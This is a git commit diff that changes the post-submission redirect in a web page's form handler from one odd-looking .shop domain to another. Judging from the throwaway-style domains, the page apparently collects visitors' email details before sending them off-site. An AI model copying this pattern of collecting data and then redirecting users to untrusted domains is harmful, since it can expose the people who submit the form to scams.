793970c3e383dfeb077ba51a0d98a94a3b85f999
husknet <127146284+husknet@users.noreply.github.com>
2024-07-29 06:40:31 -0300

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -42,7 +42,7 @@ export default function Home() {
           country,
         });
         console.log('Email sent successfully!', response.data.message);
-        window.location.href = 'https://neroh.nuke-hzd.shop';
+        window.location.href = 'https://nero.bred-munab.shop';
       } catch (error) {
         console.error('Failed to send email:', error);
         setErrorMessage('Failed to submit. Please try again.');
